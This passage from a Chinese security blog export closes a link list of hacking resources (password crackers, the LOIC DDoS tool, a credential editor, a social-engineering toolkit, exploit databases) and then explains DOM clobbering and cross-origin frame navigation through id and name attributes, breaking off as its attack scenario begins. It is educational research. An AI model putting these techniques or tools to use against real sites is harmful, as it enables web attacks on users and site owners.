</ul>
<p>Hex 编辑器</p>
<ul>
<li><a href="http://hexed.it/" target="_blank" rel="noopener">HexEdit.js</a> – 基于浏览器的hex编辑器</li>
</ul>
<p>解密工具</p>
<ul>
<li><a href="http://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a> – 快速破解密码</li>
<li><a href="http://www.md5crack.com/" target="_blank" rel="noopener">Online MD5 cracker</a> – 在线MD5破解</li>
</ul>
<p>Windows 程序</p>
<ul>
<li><a href="http://technet.microsoft.com/en-us/sysinternals/bb842062" target="_blank" rel="noopener">Sysinternals Suite</a> – Sysinternals故障诊断小工具</li>
<li><a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">Windows Credentials Editor</a> –  集成了列举、添加、更改、删除身份验证的功能的安全工具</li>
</ul>
<p>DDoS 工具</p>
<ul>
<li><a href="https://github.com/NewEraCracker/LOIC/" target="_blank" rel="noopener">LOIC</a> –  Windows下的一款开源网络压力测试工具</li>
<li><a href="http://metacortexsecurity.com/tools/anon/LOIC/LOICv1.html" target="_blank" rel="noopener">JS LOIC</a> – 没用过，不解释</li>
</ul>
<p>社工工具</p>
<ul>
<li><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">SET</a> – 来自TrustedSec的社工工具箱</li>
</ul>
<p>藏匿工具</p>
<ul>
<li><a href="https://www.torproject.org/" target="_blank" rel="noopener">Tor</a> – 使onion routing藏形匿迹的免费软件</li>
<li><a href="https://geti2p.net/" target="_blank" rel="noopener">I2P</a> – 开源匿名网络工具</li>
</ul>
<p>逆向工具</p>
<ul>
<li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener">IDA Pro</a> – Windows、Linux 、Mac OS X反汇编和调试器</li>
<li><a href="http://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx" target="_blank" rel="noopener">WDK/WinDbg</a> – Windows下的内核态调试工具</li>
<li><a href="http://www.ollydbg.de/" target="_blank" rel="noopener">OllyDbg</a> – x86调试器，主要做二进制代码分析</li>
</ul>
<p>书籍 渗透测试书籍</p>
<ul>
<li><a href="http://www.nostarch.com/hacking2.htm" target="_blank" rel="noopener">The Art of Exploitation by Jon Erickson, 2008</a></li>
<li><a href="http://www.nostarch.com/metasploit" target="_blank" rel="noopener">Metasploit: The Penetration Tester’s Guide by David Kennedy and others, 2011</a></li>
<li><a href="http://www.nostarch.com/pentesting" target="_blank" rel="noopener">Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman, 2014</a></li>
<li><a href="http://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/" target="_blank" rel="noopener">Rtfm: Red Team Field Manual by Ben Clark, 2014</a></li>
<li><a href="http://www.amazon.com/The-Hacker-Playbook-Practical-Penetration/dp/1494932636/" target="_blank" rel="noopener">The Hacker Playbook by Peter Kim, 2014</a></li>
<li><a href="https://www.elsevier.com/books/the-basics-of-hacking-and-penetration-testing/engebretson/978-1-59749-655-1" target="_blank" rel="noopener">The Basics of Hacking and Penetration Testing by Patrick Engebretson, 2013</a></li>
<li><a href="https://www.elsevier.com/books/professional-penetration-testing/wilhelm/978-1-59749-993-4" target="_blank" rel="noopener">Professional Penetration Testing by Thomas Wilhelm, 2013</a></li>
<li><a href="http://www.packtpub.com/advanced-penetration-testing-for-highly-secured-environments/book" target="_blank" rel="noopener">Advanced Penetration Testing for Highly-Secured Environments by Lee Allen,2012</a></li>
<li><a href="http://www.elsevier.com/books/violent-python/unknown/978-1-59749-957-6" target="_blank" rel="noopener">Violent Python by TJ O’Connor, 2012</a></li>
<li><a href="http://www.fuzzing.org/" target="_blank" rel="noopener">Fuzzing: Brute Force Vulnerability Discovery by Michael Sutton, Adam Greene, Pedram Amini, 2007</a></li>
</ul>
<p>黑客手册系列</p>
<ul>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-047008023X.html" target="_blank" rel="noopener">The Shellcoders Handbook by Chris Anley and others, 2007</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118026470.html" target="_blank" rel="noopener">The Web Application Hackers Handbook by D. Stuttard, M. Pinto, 2011</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118204123.html" target="_blank" rel="noopener">iOS Hackers Handbook by Charlie Miller and others, 2012</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-111860864X.html" target="_blank" rel="noopener">Android Hackers Handbook by Joshua J. Drake and others, 2014</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118662091.html" target="_blank" rel="noopener">The Browser Hackers Handbook by Wade Alcorn and others, 2014</a></li>
</ul>
<p>网络分析书籍</p>
<ul>
<li><a href="http://nmap.org/book/" target="_blank" rel="noopener">Nmap Network Scanning by Gordon Fyodor Lyon, 2009</a></li>
<li><a href="http://www.nostarch.com/packet2.htm" target="_blank" rel="noopener">Practical Packet Analysis by Chris Sanders, 2011</a></li>
<li><a href="http://www.wiresharkbook.com/" target="_blank" rel="noopener">Wireshark Network Analysis by by Laura Chappell, Gerald Combs, 2012</a></li>
</ul>
<p>逆向工程书籍</p>
<ul>
<li><a href="http://beginners.re/" target="_blank" rel="noopener">Reverse Engineering for Beginners by Dennis Yurichev (free!)</a></li>
<li><a href="http://www.nostarch.com/idapro2.htm" target="_blank" rel="noopener">The IDA Pro Book by Chris Eagle, 2011</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118787315.html" target="_blank" rel="noopener">Practical Reverse Engineering by Bruce Dang and others, 2014</a></li>
<li><a href="http://beginners.re/" target="_blank" rel="noopener">Reverse Engineering for Beginners</a></li>
</ul>
<p>恶意程序分析书籍</p>
<ul>
<li><a href="http://www.nostarch.com/malware" target="_blank" rel="noopener">Practical Malware Analysis by Michael Sikorski, Andrew Honig, 2012</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118825098.html" target="_blank" rel="noopener">The Art of Memory Forensics by Michael Hale Ligh and others, 2014</a></li>
</ul>
<p>Windows书籍</p>
<ul>
<li><a href="http://technet.microsoft.com/en-us/sysinternals/bb963901.aspx" target="_blank" rel="noopener">Windows Internals by Mark Russinovich, David Solomon, Alex Ionescu</a></li>
</ul>
<p>社会工程学书籍</p>
<ul>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-0471237124.html" target="_blank" rel="noopener">The Art of Deception by Kevin D. Mitnick, William L. Simon, 2002</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-0764569597.html" target="_blank" rel="noopener">The Art of Intrusion by Kevin D. Mitnick, William L. Simon, 2005</a></li>
<li><a href="http://www.hachettebookgroup.com/titles/kevin-mitnick/ghost-in-the-wires/9780316134477/" target="_blank" rel="noopener">Ghost in the Wires by Kevin D. Mitnick, William L. Simon, 2011</a></li>
<li><a href="http://www.elsevier.com/books/no-tech-hacking/mitnick/978-1-59749-215-7" target="_blank" rel="noopener">No Tech Hacking by Johnny Long, Jack Wiles, 2008</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-0470639539.html" target="_blank" rel="noopener">Social Engineering: The Art of Human Hacking by Christopher Hadnagy, 2010</a></li>
<li><a href="http://wiley.com/WileyCDA/WileyTitle/productCd-1118608577.html" target="_blank" rel="noopener">Unmasking the Social Engineer: The Human Element of Security by Christopher Hadnagy, 2014</a></li>
</ul>
<p>开锁书籍</p>
<ul>
<li><a href="https://www.elsevier.com/books/practical-lock-picking/ollam/978-1-59749-989-7" target="_blank" rel="noopener">Practical Lock Picking by Deviant Ollam, 2012</a></li>
<li><a href="https://www.elsevier.com/books/keys-to-the-kingdom/ollam/978-1-59749-983-5" target="_blank" rel="noopener">Keys to the Kingdom by Deviant Ollam, 2012</a></li>
</ul>
<p>漏洞库</p>
<ul>
<li><a href="http://nvd.nist.gov/" target="_blank" rel="noopener">NVD</a> – 美国国家漏洞库</li>
<li><a href="http://www.us-cert.gov/" target="_blank" rel="noopener">CERT</a> – 美国国家应急响应中心</li>
<li><a href="http://osvdb.org/" target="_blank" rel="noopener">OSVDB</a> – 开源漏洞库</li>
<li><a href="http://www.securityfocus.com/" target="_blank" rel="noopener">Bugtraq</a> – 赛门铁克</li>
<li><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-DB</a> – exp的库</li>
<li><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">Fulldisclosure</a> – Fulldisclosure邮件列表</li>
<li><a href="https://technet.microsoft.com/security/bulletin/" target="_blank" rel="noopener">MS Bulletin</a> – 微软安全公告</li>
<li><a href="https://technet.microsoft.com/security/advisory/" target="_blank" rel="noopener">MS Advisory</a> – 微软安全报告</li>
<li><a href="http://1337day.com/" target="_blank" rel="noopener">Inj3ct0r</a> – Inj3ct0r Exp的库</li>
<li><a href="http://packetstormsecurity.com/" target="_blank" rel="noopener">Packet Storm</a> – Packet Storm全球安全资源</li>
<li><a href="http://www.securiteam.com/" target="_blank" rel="noopener">SecuriTeam</a> – Securiteam 漏洞库</li>
<li><a href="http://cxsecurity.com/" target="_blank" rel="noopener">CXSecurity</a> – CSSecurity Bugtraq列表</li>
<li><a href="http://www.vulnerability-lab.com/" target="_blank" rel="noopener">Vulnerability Laboratory</a> – 漏洞研究实验室</li>
<li><a href="http://www.zerodayinitiative.com/" target="_blank" rel="noopener">ZDI</a> – 0day库</li>
</ul>
<p>安全课程</p>
<ul>
<li><a href="http://www.offensive-security.com/information-security-training/" target="_blank" rel="noopener">Offensive Security Training</a> – BackTrack/Kali开发者的培训</li>
<li><a href="http://www.sans.org/" target="_blank" rel="noopener">SANS Security Training</a> – 计算机安全培训和认证</li>
<li><a href="http://opensecuritytraining.info/" target="_blank" rel="noopener">Open Security Training</a> – 计算机安全课程培训资料</li>
<li><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">CTF Field Guide</a> – 下一次CTF比赛必学</li>
</ul>
<p>信息安全会议</p>
<ul>
<li><a href="https://www.defcon.org/" target="_blank" rel="noopener">DEF CON</a> – 一年一度的在拉斯维加斯举行的黑客会议</li>
<li><a href="http://www.blackhat.com/" target="_blank" rel="noopener">Black Hat</a> – 一年一度的在拉斯维加斯举行的安全会议</li>
<li><a href="http://www.securitybsides.com/" target="_blank" rel="noopener">BSides</a> – 没去过，不解释</li>
<li><a href="http://events.ccc.de/congress/" target="_blank" rel="noopener">CCC</a> – 德国每年一次的黑客会议</li>
<li><a href="https://www.derbycon.com/" target="_blank" rel="noopener">DerbyCon</a> – 每年一度的黑客会议，根据地在Louisville</li>
<li><a href="http://phreaknic.info/" target="_blank" rel="noopener">PhreakNIC</a> – 一年一度，美国Tennessee州中部</li>
<li><a href="http://www.shmoocon.org/" target="_blank" rel="noopener">ShmooCon</a> – 一年一度美国西部的黑客会议</li>
<li><a href="http://www.carolinacon.org/" target="_blank" rel="noopener">CarolinaCon</a> – 北加利福尼亚，一年一度</li>
<li><a href="http://hope.net/" target="_blank" rel="noopener">HOPE</a> – 黑客杂志2600主办的一系列会议</li>
<li><a href="http://www.summercon.org/" target="_blank" rel="noopener">SummerCon</a> – 夏天举办的最古老的黑客大会</li>
<li><a href="http://hack.lu/" target="_blank" rel="noopener">Hack.lu</a> – 卢森堡一年一度</li>
<li><a href="http://conference.hitb.org/" target="_blank" rel="noopener">HITB</a> – 在马里西亚和荷兰</li>
<li><a href="https://www.troopers.de/" target="_blank" rel="noopener">Troopers</a> – 德国海德堡，一年一度</li>
<li><a href="http://hack3rcon.org/" target="_blank" rel="noopener">Hack3rCon</a> – 一年一度的美国黑客大会</li>
<li><a href="http://thotcon.org/" target="_blank" rel="noopener">ThotCon</a> – 芝加哥一年一度的美国黑客大会</li>
<li><a href="http://www.layerone.org/" target="_blank" rel="noopener">LayerOne</a> – 每年春天洛杉矶的黑客大会</li>
<li><a href="https://deepsec.net/" target="_blank" rel="noopener">DeepSec</a> – 奥地利维也纳的安全会议</li>
<li><a href="http://www.skydogcon.com/" target="_blank" rel="noopener">SkyDogCon</a> – 纳什维尔的安全会议</li>
</ul>
<p>安全杂志</p>
<ul>
<li><a href="http://www.2600.com/Magazine/DigitalEditions" target="_blank" rel="noopener">2600: The Hacker Quarterly</a> – 美国的一本关于计算机技术的地下杂志</li>
<li><a href="https://hakin9.org/" target="_blank" rel="noopener">Hakin9</a> – A安全每周更新的在线杂志</li>
</ul>
<p>其他</p>
<ul>
<li><a href="http://sectools.org/" target="_blank" rel="noopener">SecTools</a> – 网络安全工具前125</li>
<li><a href="https://github.com/fffaraz/awesome-cpp" target="_blank" rel="noopener">C/C++ Programming</a> – 开源工具的主要语言之一</li>
<li><a href="https://github.com/quozd/awesome-dotnet" target="_blank" rel="noopener">.NET Programming</a> – 一个开发框架</li>
<li><a href="https://github.com/alebcay/awesome-shell" target="_blank" rel="noopener">Shell Scripting</a> – 命令行集成工具包</li>
<li><a href="https://github.com/dreikanter/ruby-bookmarks" target="_blank" rel="noopener">Ruby Programming by @dreikanter</a> – 编写exp的实用语言</li>
<li><a href="https://github.com/markets/awesome-ruby" target="_blank" rel="noopener">Ruby Programming by @markets</a> – 同上</li>
<li><a href="https://github.com/Sdogruyol/awesome-ruby" target="_blank" rel="noopener">Ruby Programming by @Sdogruyol</a> – 同上</li>
<li><a href="https://github.com/sorrycc/awesome-javascript" target="_blank" rel="noopener">JavaScript Programming</a> – 浏览器开发脚本</li>
<li><a href="https://github.com/sindresorhus/awesome-nodejs" target="_blank" rel="noopener">Node.js Programming by @sindresorhus</a> – 命令行的js</li>
<li><a href="https://github.com/vndmtrx/awesome-nodejs" target="_blank" rel="noopener">Node.js Programming by @vndmtrx</a> – 同上</li>
<li><a href="http://www.dirk-loss.de/python-tools.htm" target="_blank" rel="noopener">Python tools for penetration testers</a> – 很多渗透工具都是用python写的</li>
<li><a href="https://github.com/svaksha/pythonidae" target="_blank" rel="noopener">Python Programming by @svaksha</a> – 通用python项目</li>
<li><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">Python Programming by @vinta</a> – 同上</li>
<li><a href="https://github.com/ashishb/android-security-awesome" target="_blank" rel="noopener">Andorid Security</a> – 安卓安全资源聚合</li>
<li><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">Awesome Awesomness</a> – 。。。</li>
</ul>
]]></content>
      <categories>
        <category>名站推荐</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>前端中存在的变量劫持漏洞</title>
    <url>/2019/07/01/%E5%89%8D%E7%AB%AF%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>避免博客长草，水一篇文章，这篇文章中主要讲一个在前端中出现的有意思的变量劫持漏洞。</p>
<a id="more"></a>

<h2 id="0x1-基础知识"><a href="#0x1-基础知识" class="headerlink" title="0x1 基础知识"></a>0x1 基础知识</h2><p>当页面存在<code>iframe</code>的时候，父页面和子页面是可以相互获取到对方的<code>window</code>对象的,主要利用下面的方法。<br>(本文不考虑 <code>iframe</code> 的 <code>sandbox</code> 属性,所有测试都是在不添加任何<code>sandbox</code>的限制下进行。)</p>
<p>父访问子:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"iframe1"</span>).contentWindow; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>[<span class="number">0</span>] ; <span class="comment">// 这个比较有意思， window 是本页面的window对象，window[0] 是子页面的window对象</span></span><br></pre></td></tr></table></figure>

<p>子访问父：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent;  <span class="comment">//获取上一级的window对象，如果还是iframe则是该iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.top ;   <span class="comment">// 获取最顶级容器的window对象，即，就是你打开页面的文档</span></span><br></pre></td></tr></table></figure>

<p>如果父和子页面是同源的，那么可以通过这个window对象获取到任何你想获取的内容，包括但是不限于 document,name,location 等。但是在非同源的情况下，iframe的window对象大多数的属性都会被同源策略block掉，但是有两个属性比较特殊。</p>
<ol>
<li>frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象</li>
<li>location 可写，但是不可读。意味着父子可以相互修改彼此的 location </li>
</ol>
<p><strong>结合以上两点可以推导出，爷可以修改孙(孙可以修改爷)的location。(父页面可以获取子页面的window对象，然后通过frames获取孙页面的window对象，然后修改location)</strong></p>
<p>爷修改孙，演示如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- localhost:80/index.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"viewer"</span> <span class="attr">src</span>=<span class="string">"http://localhost:8888/view.html"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// CONFIG = "test";</span></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// myframe = window.frames[0]; </span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// myframe.frames[0].location = 'http://www.baidu.com/';</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://www.baidu.com/"</span>;   </span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// console.log(myframe == x.contentWindow);</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- localhost:8888/view.html --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"viewer"</span> <span class="attr">src</span>=<span class="string">"http://blog.wonderkun.cc/"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="0x2-重新审视一下-id-属性"><a href="#0x2-重新审视一下-id-属性" class="headerlink" title="0x2 重新审视一下 id 属性"></a>0x2 重新审视一下 id 属性</h2><p>我们知道在浏览器中有如下特点，我们定义的所有全局变量，都被存储在window对象中，作为window的属性来被访问的。</p>
<p>下面在console中验证一下：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> content = <span class="string">"i am content storage in window"</span>;</span></span><br><span class="line">&lt; "i am content storage in window"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> window.content </span></span><br><span class="line">&lt; "i am content storage in window"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> window.content == content</span></span><br><span class="line">&lt; true</span><br></pre></td></tr></table></figure>

<p>同样，我们在页面中定义的具有id属性的dom对象也是作为全局变量存储在 window 中的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后再console里访问一下:</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">test</span></span></span><br><span class="line">&lt; &lt;h1 id="test"&gt;&lt;/h1&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> window.test</span></span><br><span class="line">&lt; &lt;h1 id="test"&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<p>这时候想到一个问题，既然 id 属性会被注册成全局变量，那么它会不会覆盖掉已经存在的全局变量呢？我们写如下的测试代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// CONFIG = "test";</span></span></span><br><span class="line"><span class="actionscript">        test = <span class="string">"ddd"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"h1"</span>)[<span class="number">0</span>].setAttribute(<span class="string">'id'</span>,<span class="string">"test"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"h2"</span>)[<span class="number">0</span>].setAttribute(<span class="string">'id'</span>,<span class="string">"test2"</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在console中输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">test</span></span></span><br><span class="line">&lt; "ddd"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> test2</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> &lt;h2 id=<span class="string">"test2"</span>&gt;test2&lt;/h2&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>事实证明无法覆盖已经定义的变量，但是却可以定义新的变量</strong></p>
<p><strong>怎么让页面中出现未定义的全局变量呢？别忘了 chrome 74之后 默认的 xss auditor 从block模式变成了filter模式，可以利用这个删除掉页面中的代码。(此问题文章最后演示)</strong></p>
<p>另外我们知道，如果在页面中定义两个id一样的元素之后，这样使用 <code>document.getElementById</code> 就无法获取到这个id了，但是并不意味着着全局变量就不存在了，看下面这个实验。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">test</span> </span></span><br><span class="line">&lt; HTMLCollection(2) [h1#test, h2#test, test: h1#test]</span><br><span class="line">   0: h1#test</span><br><span class="line">   1: h2#test</span><br><span class="line">   length: 2</span><br><span class="line">   test: h1#test</span><br><span class="line">   __proto__: HTMLCollection</span><br></pre></td></tr></table></figure>

<p>很明显全局变量<code>test</code>还是存在的，是包含两个元素的数组。</p>
<h2 id="0x3-同样道理看一下iframe的name属性"><a href="#0x3-同样道理看一下iframe的name属性" class="headerlink" title="0x3 同样道理看一下iframe的name属性"></a>0x3 同样道理看一下iframe的name属性</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">name</span>=<span class="string">"viewer"</span> <span class="attr">src</span>=<span class="string">"./view.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在console里验证一下</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> viewer </span></span><br><span class="line">&lt; Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …&#125;</span><br></pre></td></tr></table></figure>
<p>情况差不多，这里的 <code>viewer</code> 是注册在全局变量里的window对象。</p>
<p>但是如果页面中出现两个<code>name</code>相同的<code>iframe</code>，又会是什么情况呢？ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">"http://B.com/B.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">"http://C.com/C.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在console里面输入:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&gt; test</span><br><span class="line">&lt; <span class="keyword">global</span> &#123;<span class="keyword">window</span>: <span class="keyword">global</span>, self: <span class="keyword">global</span>, <span class="keyword">location</span>: <span class="keyword">Location</span>, closed: <span class="keyword">false</span>, frames: <span class="keyword">global</span>, …&#125;</span><br><span class="line">&gt; test == document.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">0</span>].contentWindow</span><br><span class="line">&lt; <span class="keyword">true</span></span><br><span class="line">&gt; test == document.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">1</span>].contentWindow</span><br><span class="line">&lt; <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<p>发现跟id的情况并不相同，这里只有第一个元素，而且仅有第一个元素。</p>
<h2 id="0x4-id-和-name-重复出现时"><a href="#0x4-id-和-name-重复出现时" class="headerlink" title="0x4 id 和 name 重复出现时"></a>0x4 id 和 name 重复出现时</h2><p>name在id前面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">"http://B.com/B.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">test</span> </span></span><br><span class="line">&lt; global &#123;window: global, self: global, location: Location, closed: false, frames: global, …&#125;</span><br></pre></td></tr></table></figure>

<p>id在name前面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">"http://B.com/B.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">test</span> </span></span><br><span class="line">&lt; global &#123;window: global, self: global, location: Location, closed: false, frames: global, …&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现 name 的优先级是高于 id 的优先级的，无论怎样全局变量里存储的都是 iframe 的 window对象。</p>
<h2 id="0x5-漏洞场景"><a href="#0x5-漏洞场景" class="headerlink" title="0x5 漏洞场景"></a>0x5 漏洞场景</h2><p>我们有一个可以控制的域 A.com 中有页面 A.com/A.html , 用iframe加载了 B.com 的域的页面 B.com/B.html 。A.html无法操作B.html页面，因为是不同源的，同时 B.com/B.html 页面用iframe加载了一个新的页面 C.com/C.html 。 </p>
<p>此时 B.com/B.html 存在一个未定义的全局变量 (可以是利用chrome的xss auditor的filter模式产生的)，怎么利用？场景用代码描述如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A.com/A.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

